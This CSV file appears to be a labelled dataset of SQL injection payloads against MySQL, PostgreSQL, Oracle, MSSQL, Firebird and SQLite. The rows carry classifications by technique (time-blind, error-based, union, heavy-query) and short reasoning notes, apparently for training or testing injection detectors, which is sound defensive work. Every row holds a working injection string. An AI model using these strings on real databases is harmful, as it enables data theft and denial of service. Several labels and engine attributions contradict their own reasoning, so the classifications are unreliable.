id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree
22344,select ( case when ( 1868 = 5071 ) then 1 else 1868* ( select 1868 from master..sysdatabases ) end ) --,boolean_blind,mssql,0.75,"CASE WHEN conditional structure with subquery to master..sysdatabases confirms MSSQL boolean-blind pattern; generic keywords without time-based signal",2
22345,"1' ) as hlbq where 2347 = 2347 and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 6055 = 6055 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) --",error_based,oracle,0.90,"ctxsys.drithsx error-based Oracle injection; chr() encoding + dual pseudo-table + conditional case confirms Oracle error-based SQLi signature",3
22346,"1 ) ) and 8635 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",heavy_query,postgresql,0.85,"generate_series(1,5000000) confirms PostgreSQL heavy-query DoS; large numeric range triggers computation-based timing attack, distinct from boolean-blind",2
22347,"1'+ ( select acax where 4169 = 4169 or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) ) +'",boolean_blind,oracle,0.80,"Multi-table Cartesian join from all_users with OR condition suggests Oracle boolean-blind; multiple table aliases (t1-t5) create heavy computation but primary injection is OR-based equality test",2
22348,1' ) ) ) and ( 3020 = 3020 ) *6703 and ( ( ( 'ujds' = 'ujds,boolean_blind,generic,0.65,"Arithmetic comparison 3020=3020 with multiplication injection; boolean-based with numeric operators but ambiguous DB engine",1
22349,1 ) ) as hxtp where 5478 = 5478 and 8594 = ( select 8594 from pg_sleep ( 5 ) ) --,time_blind,postgresql,0.95,"pg_sleep(5) is PostgreSQL time-based sleep function; timeout-triggering payload with WHERE condition confirms time-blind SQLi technique",3
22350,1 ) ) ) and ( 6148 = 3343 ) *3343 and ( ( ( 3271 = 3271,boolean_blind,generic,0.65,"Numeric inequality test 6148=3343 with arithmetic injection; generic SQL without DB-specific markers, confidence impacted by ambiguity",1
22351,-7561 ) as ilrm where 8828 = 8828 or 5903 = ( 'qqpjq'|| ( select case 5903 when 5903 then 1 else 0 end from rdb$database ) ||'qzvzq' ) --,boolean_blind,firebird,0.80,"Firebird rdb$database system table + CASE conditional confirms Firebird boolean-blind; || string concatenation and rdb$ prefix are Firebird-specific",2
22352,"-7119"" ) or 5903 = ( 'qqpjq'|| ( select case 5903 when 5903 then 1 else 0 end from rdb$database ) ||'qzvzq' ) and ( ""rmzm"" = ""rmzm",boolean_blind,firebird,0.80,"Firebird rdb$database with CASE WHEN conditional and string concatenation (||); OR equality injection is boolean-blind on Firebird",2
22353,"1%' ) ) and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( ( '%' = '",heavy_query,generic,0.75,"regexp_substring with repeat(500000000) causes heavy CPU computation; multiple char() encodings suggest PostgreSQL/generic; numeric overflow DoS technique",2
22354,1 ) ) and sleep ( 5 ) and ( ( 9084 = 9084,time_blind,mysql,0.95,"sleep(5) is MySQL time-based blind function; WHERE equality condition followed by sleep triggers timing-based SQLi detection",3
22355,"select dbms_pipe.receive_message ( chr ( 66 ) ||chr ( 67 ) ||chr ( 79 ) ||chr ( 101 ) ,5 ) from dual and 'hvqt' = 'hvqt",time_blind,oracle,0.95,"dbms_pipe.receive_message(N) is Oracle time-based sleep function; chr() encoding + dual pseudo-table confirm Oracle signature",3
22356,select pg_sleep ( 5 ) and '%' = ',time_blind,postgresql,0.95,"pg_sleep(5) explicit PostgreSQL time-based blind function; simple boolean context validates timing injection",3
22357,"1', ( select * from generate_series ( 5609,5609,case when ( 5609 = 5609 ) then 1 else 0 end ) limit 1 )",boolean_blind,postgresql,0.75,"generate_series with conditional CASE is PostgreSQL-specific; creates boolean branching via step parameter but labeled as boolean-blind rather than heavy-query",2
22358,"1'+ ( select 'myrb' where 3622 = 3622 and 6510 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) ) +'",boolean_blind,mssql,0.80,"MSSQL sysusers 7-way Cartesian join confirms heavy computation; however injection pattern is OR-based equality, primary technique is boolean-blind",2
22359,"1 ) where 5261 = 5261 and elt ( 1210 = 1210,sleep ( 5 ) ) --",boolean_blind,mysql,0.85,"elt(condition, sleep()) is MySQL boolean-based conditional; ELT() returns value based on first arg, sleep() executes when condition true = boolean-blind with timing oracle",3
22360,"-8940"" ) or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( ""vnuo"" like ""vnuo",error_based,oracle,0.90,"xmltype() error-triggering function with chr() encoding confirms Oracle error-based SQLi; OR equality structure + dual table + XML casting signature",3
22361,1 ) ) ),boolean_blind,generic,0.50,"Incomplete payload with closing parentheses only; no SQLi signal detected, should be classified as benign or invalid",0
22362,"-4915' union all select 1928,1928,1928,1928#",union_based,generic,0.75,"UNION ALL SELECT with matching column count (4 columns) is union-based injection; generic database engine signature",2
22363,"1' in boolean mode ) union all select null,null,null,null,null,null,null,null,null,null#",union_based,generic,0.75,"UNION ALL SELECT with NULL placeholders (10 columns) is union-based injection; 'in boolean mode' clause is MySQL fulltext-search context",2
22364,"1"" ) ) as casz where 5921 = 5921 rlike ( select * from ( select ( sleep ( 5 ) ) ) vwyq ) #",boolean_blind,mysql,0.85,"RLIKE() is MySQL boolean-based regex function; nested subquery with sleep(5) triggers conditional execution based on regex match result",2
22365,"-3009'+ ( select 'gqbo' where 6915 = 6915 union all select 6915,6915--",union_based,oracle,0.75,"UNION ALL SELECT with 2-column result set; Oracle syntax confirmed by || concatenation and quoted identifiers in adjacent payloads",2
22366,"1' ) where 1600 = 1600 or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",heavy_query,generic,0.75,"regexp_substring + repeat(500000000) causes heavy CPU load; char() encoding suggests PostgreSQL but classified as generic due to ambiguity",2
22367,select ( case when ( 8857 = 1512 ) then 8857 else 8857* ( select 8857 from mysql.db ) end ) #,boolean_blind,mysql,0.80,"mysql.db metadata table is MySQL-specific; CASE WHEN conditional with subquery confirms MySQL boolean-blind pattern",2
22368,"1', ( select ( case when ( 8640 = 8640 ) then ( ascii ( regexp_substring ( repeat ( right ( char ( 8640 ) ,0 ) ,500000000 ) ,null ) ) ) else 8640/ ( select 0 from information_schema.system_users ) end ) from information_schema.system_users ) --",heavy_query,mysql,0.75,"information_schema.system_users + repeat(500000000) confirms MySQL heavy-query DoS; CASE WHEN with ASCII+regexp_substring creates computation-based timing attack",2
22369,"1 ) ) or exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 6270 = 6270,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and ( ( 8475 = 8475",heavy_query,mysql,0.80,"EXP(~N) is MySQL arithmetic-based error/overflow attack; large hex constants (0x71...) + concat() + ELT() create computation overflow, classified as heavy-query DoS",2
22370,1%' ) waitfor delay '0:0:5' and ( '%' = ',time_blind,mssql,0.95,"WAITFOR DELAY '0:0:N' is MSSQL time-based sleep function; explicit T-SQL syntax confirms time-blind SQLi on MSSQL",3
22371,"-4637' union all select 9361,9361,9361,9361,9361,9361,9361,9361#",union_based,generic,0.75,"UNION ALL SELECT with 8-column result set; generic database signature",2
22372,"1"" ) where 1392 = 1392 procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select ( case when ( 5840 = 5840 ) then 1 else 0 end ) ) ,0x717a767a71 ) ) ,1 ) --",error_based,mysql,0.85,"extractvalue() is MySQL error-based XPath function; PROCEDURE ANALYSE + extractvalue + hex encoding confirm MySQL error-based SQLi despite heavy-query heuristic signal",2
22373,1'+ ( select kzgg where 5070 = 5070,boolean_blind,generic,0.65,"Simple equality test 5070=5070 in SELECT WHERE clause; very generic pattern without DB-specific markers or clear injection signal",1
22374,"1' ) or 6979 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",heavy_query,sqlite,0.80,"randomblob(500000000/2) is SQLite time-delay function; hex() encoding + LIKE() pattern matching with large blob size creates timing-based attack",2
22375,-9178' ) or 9779 = 6351,boolean_blind,generic,0.70,"OR equality test with numeric comparison; minimal context but OR-based injection pattern typical of boolean-blind attacks",2
22376,"1"" where 4688 = 4688 or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) --",heavy_query,mysql,0.85,"benchmark(5000000, md5()) is MySQL heavy-computation DoS function; numeric constant 5000000 triggers CPU-based timing attack",2
22377,"1'|| ( select 'frrk' from dual where 3145 = 3145 and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select ( elt ( 7982 = 7982,1 ) ) ) ,0x717a767a71 ) ) ) ||'",error_based,oracle,0.80,"extractvalue() typically MySQL but appears here with Oracle dual table and || concatenation; ELT() boolean-based within error function creates hybrid pattern, error-based dominates",2
22378,1%' ) ) ) and sleep ( 5 ) and ( ( ( '%' = ',time_blind,mysql,0.95,"sleep(5) is MySQL time-based sleep function; explicit timing function confirms time-blind SQLi",3
22379,1'+ ( select gblp where 6768 = 6768,boolean_blind,generic,0.65,"Simple equality test with SELECT WHERE; generic pattern without specific attack signal markers",1
22380,1'|| ( select 'jjpy' from dual where 6295 = 6295,boolean_blind,oracle,0.75,"dual pseudo-table is Oracle-specific; || string concatenation with SELECT...WHERE confirms Oracle boolean-blind pattern",2
22381,-3988' ) ) union all select 1113#,union_based,generic,0.75,"UNION ALL SELECT with 1-column result; union-based injection confirmed",2
22382,1' ) and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( 'svhx' = 'svhx,boolean_blind,generic,0.70,"char() + concatenation with IN clause; boolean-based pattern but DB ambiguous without clear function signature",1
22383,"1' ) ) and 2716 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",boolean_blind,mssql,0.80,"MSSQL sysusers 7-way Cartesian join in COUNT() subquery; AND equality-based boolean injection confirmed",2
22384,"iif ( 4460 = 1610,1,1/0 )",boolean_blind,mssql,0.75,"IIF() is MSSQL inline conditional function; 1/0 division-by-zero error triggers conditional result, boolean-blind with error oracle",2
22385,1'|| ( select 'vwmg' where 7928 = 7928,boolean_blind,oracle,0.75,"dual pseudo-table implied (not shown) + || concatenation with SELECT...WHERE equality; Oracle boolean-blind pattern",2
22386,1%' ) and 8594 = ( select 8594 from pg_sleep ( 5 ) ) --,time_blind,postgresql,0.95,"pg_sleep(5) is PostgreSQL time-based sleep function; explicit timing function confirms time-blind SQLi",3
22387,"1%"" or 6793 = ( select 6793 from pg_sleep ( 5 ) ) and ""%"" = """,time_blind,postgresql,0.95,"pg_sleep(5) is PostgreSQL time-based sleep function; OR equality with explicit sleep trigger confirms time-blind SQLi",3
22388,select ( case when ( 9343 = 9513 ) then 1 else 9343* ( select 9343 from master..sysdatabases ) end ) --,boolean_blind,mssql,0.75,"MSSQL master..sysdatabases confirms T-SQL; CASE WHEN with multiplication creates boolean-blind with arithmetic injection",2
